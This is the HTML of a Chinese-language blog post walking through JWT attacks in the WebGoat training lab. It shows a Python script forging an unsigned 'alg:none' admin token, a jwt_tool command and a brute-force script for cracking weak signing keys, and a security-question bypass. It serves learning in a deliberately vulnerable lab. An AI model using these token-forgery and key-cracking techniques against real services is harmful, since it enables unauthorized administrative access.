@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Bamboo22 's Blog | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="JWT的攻击方法webgoat靶场搭建我用的是docker搭建，这样快一点，也可以在GitHub上下载了直接拖到kali里，但是很慢 12docker pull webgoat/webgoat-8.0    拉取dockerdocker images     查看容器是否下载成功  运行靶场 1sudo docker run -p 8080:8080 -t webgoat/webgoat-8.0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bamboo22 's Blog">
+<meta property="og:url" content="http://example.com/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="Bamboo22 's Blog">
+<meta property="og:description" content="JWT的攻击方法webgoat靶场搭建我用的是docker搭建，这样快一点，也可以在GitHub上下载了直接拖到kali里，但是很慢 12docker pull webgoat/webgoat-8.0    拉取dockerdocker images     查看容器是否下载成功  运行靶场 1sudo docker run -p 8080:8080 -t webgoat/webgoat-8.0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.bimg.cc/random">
+<meta property="article:published_time" content="2024-01-22T13:56:53.286Z">
+<meta property="article:modified_time" content="2023-10-30T08:24:28.524Z">
+<meta property="article:author" content="Bamboo22">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.bimg.cc/random"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Bamboo22 \'s Blog',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-30 16:24:28'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.bimg.cc/random')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-30T08:24:28.524Z" title="更新于 2023-10-30 16:24:28">2023-10-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://api.bimg.cc/random');"></div><article class="post-content" id="article-container"><h2 id="JWT的攻击方法"><a href="#JWT的攻击方法" class="headerlink" title="JWT的攻击方法"></a>JWT的攻击方法</h2><h3 id="webgoat靶场搭建"><a href="#webgoat靶场搭建" class="headerlink" title="webgoat靶场搭建"></a>webgoat靶场搭建</h3><p>我用的是docker搭建，这样快一点，也可以在GitHub上下载了直接拖到kali里，但是很慢</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0    拉取docker</span><br><span class="line">docker images     查看容器是否下载成功</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="http://pic.bamboo22.top/image-20230620104650145.png"><br>运行靶场</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -p 8080:8080 -t webgoat/webgoat-8.0 </span><br></pre></td></tr></tbody></table></figure>
+
+<p>之后通过浏览器访问 <code>http://127.0.0.1:8080/WebGoat</code> 就可以了</p>
+<p>在宿主机上也能访问<code>http://192.168.144.128:8080/WebGoat</code>，方便抓包</p>
+<p>github官方连接，也可以直接下载拖到kali上<a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat/releases">Releases · WebGoat/WebGoat (github.com)</a></p>
+<p><img src="http://pic.bamboo22.top/image-20230620104946666.png"></p>
+<p><img src="http://pic.bamboo22.top/image-20230620105023348.png"></p>
+<p>第一次进去要注册，之后登录就可以用了</p>
+<h3 id="空加密验证攻击"><a href="#空加密验证攻击" class="headerlink" title="空加密验证攻击"></a>空加密验证攻击</h3><p><img src="http://pic.bamboo22.top/image-20230620111115257.png"></p>
+<p>打开JWT tokens的第4部分</p>
+<p>点击vote now 弹窗提示我们游客不能投票，需要登录</p>
+<p>这关的要求是切换到管理员身份就能重置投票</p>
+<p><img src="http://pic.bamboo22.top/image-20230620111411253.png"></p>
+<p>点击切换到Tom并抓包</p>
+<p><img src="http://pic.bamboo22.top/image-20230620121908728.png"></p>
+<p>抓包后能看到token值 （这里记得多抓几次，有些时候看不到）</p>
+<p><img src="http://pic.bamboo22.top/image-20230620122439982.png"></p>
+<p>然后将这个值拿到解析网站去解析<a target="_blank" rel="noopener" href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
+<p><img src="http://pic.bamboo22.top/image-20230620122556951.png"></p>
+<p>可以看出，这里采用了hs512算法进行加密验证，然后用户名是Tom。 那么，接下来我们尝试一下利用空加密进行绕过！！！</p>
+<p>具体的exp代码如下：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64urlencode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">b'+'</span>, <span class="string">b'-'</span>).replace(<span class="string">b'/'</span>, <span class="string">b'_'</span>).replace(<span class="string">b'='</span>, <span class="string">b''</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b64urlencode(<span class="string">b'{"alg":"none"}'</span>)+<span class="string">b'.'</span>+b64urlencode(<span class="string">b'{"iat":1573470025,"admin":"true","user":"Jerry"}'</span>)+<span class="string">b'.'</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行结果：</span><br><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE1NzM0NzAwMjUsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="http://pic.bamboo22.top/image-20230620122856301.png"></p>
+<p>看到这里，我们将admin对应的值更改为了true ， 也就是说此时，我们设置了Jerry这个用户为admin。 然后由于还设置了alg为空密码，因此，可以绕过签名密钥未知的情况！！！ 那么，我们把之前抓到的包放出去看看：</p>
+<p><img src="http://pic.bamboo22.top/image-20230620123037686.png"></p>
+<p>可以看到已经重置投票了</p>
+<p><img src="http://pic.bamboo22.top/image-20230620123359767.png"></p>
+<h3 id="字典爆破"><a href="#字典爆破" class="headerlink" title="字典爆破"></a>字典爆破</h3><p>对 JWT 的密钥爆破需要在一定的前提下进行：</p>
+<ul>
+<li>知悉JWT使用的加密算法</li>
+<li>一段有效的、已签名的token</li>
+<li>签名用的密钥不复杂（弱密钥）</li>
+</ul>
+<p>进入下一关，看到题目描述是去找到秘钥，提交一个新的key，将username改为WebGoat</p>
+<p><img src="http://pic.bamboo22.top/image-20230620154547838.png"></p>
+<p>先把token丢到加密网站看看是什么内容</p>
+<p><img src="http://pic.bamboo22.top/image-20230620154943362.png"></p>
+<p>接下来我们需要爆破私钥</p>
+<p>我使用的是JWT_tool爆破</p>
+<p><a target="_blank" rel="noopener" href="http://t.csdn.cn/y9B86">JWT攻击手册(附jwt_tool用法,爆破弱密钥等)</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py JWT_HERE -C -d dictionary.txt     用dictionary.txt作为字典爆破</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="http://pic.bamboo22.top/image-20230620172719645.png"></p>
+<p>得到key的值是<code>available</code></p>
+<p>在这里我找字典找了很久，最后在这里找到<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">TheKingOfDuck/fuzzDicts: Web Pentesting Fuzz (github.com)</a></p>
+<p>也可以跑python脚本，网上找到的python脚本，但是我跑的时候一直报错，还没解决</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    jwt_str = <span class="string">R'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY3MDc2NTAzOCwiZXhwIjoxNjcwNzY1MDk4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.aIR7sjd5o7XJgUkYPCw76e9iF838G-Hh9J-sN1M-J94'</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'top1000.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'\r'</span>, <span class="string">'\bbingo! found key --&gt;'</span>, termcolor.colored(key_, <span class="string">'green'</span>), <span class="string">'&lt;--'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'\r'</span>, <span class="string">'\bbingo! found key --&gt;'</span>, termcolor.colored(key_, <span class="string">'green'</span>), <span class="string">'&lt;--'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'\r'</span>, <span class="string">' '</span> * <span class="number">64</span>, <span class="string">'\r\btry'</span>, key_, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'\r'</span>, <span class="string">'\bsorry! no key be found.'</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>得到key后修改内容</p>
+<p><img src="http://pic.bamboo22.top/image-20230620173102617.png"></p>
+<p>这道题还设置了时间戳，将exp中的时间即过期时间，将其设置为一个当前时间之后的数</p>
+<p><img src="http://pic.bamboo22.top/image-20230620173338087.png"></p>
+<p>成功</p>
+<p><img src="http://pic.bamboo22.top/image-20230620173318200.png"></p>
+<h3 id="认证-键值逻辑"><a href="#认证-键值逻辑" class="headerlink" title="认证-键值逻辑"></a>认证-键值逻辑</h3><p><img src="http://pic.bamboo22.top/image-20230621164429911.png"></p>
+<p>这一关应该是一个真实案例，一个应用键值逻辑来绕过的例子</p>
+<p><img src="http://pic.bamboo22.top/image-20230621164902180.png"></p>
+<p>下面这个问题描述，大概意思就是你要重置密码，但是用的是无法识别的设备或地址，需要回答验证问题，但是你忘了你设置的答案</p>
+<p>看一下源码：</p>
+<p><img src="http://pic.bamboo22.top/8249cc0956ef4a23802d72759dd50b5f.png"></p>
+<p>这里可以看出来，一共有两个问题并且有相应的答案。 那么试想一下，如果我们查询secQuestion2， 则由于数据库里无secQuestion2的字段，那么当我们查询的时候则对应的secQuestion2的值就为none，或者其他的什么    因此，我们可以尝试一下设置：</p>
+<p><img src="http://pic.bamboo22.top/fcaa473f9cc643c8b8478723642cd262.png"><br>将两个问题都改为none</p>
+<p><img src="http://pic.bamboo22.top/image-20230621170933205.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">http://example.com/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://api.bimg.cc/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/01/22/JWT/" title=""><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">一蓑烟雨任平生</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcom to My Blog !</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">JWT的攻击方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webgoat%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">webgoat靶场搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%8A%A0%E5%AF%86%E9%AA%8C%E8%AF%81%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">空加密验证攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.</span> <span class="toc-text">字典爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81-%E9%94%AE%E5%80%BC%E9%80%BB%E8%BE%91"><span class="toc-number">1.4.</span> <span class="toc-text">认证-键值逻辑</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/JWT/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/JWT/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
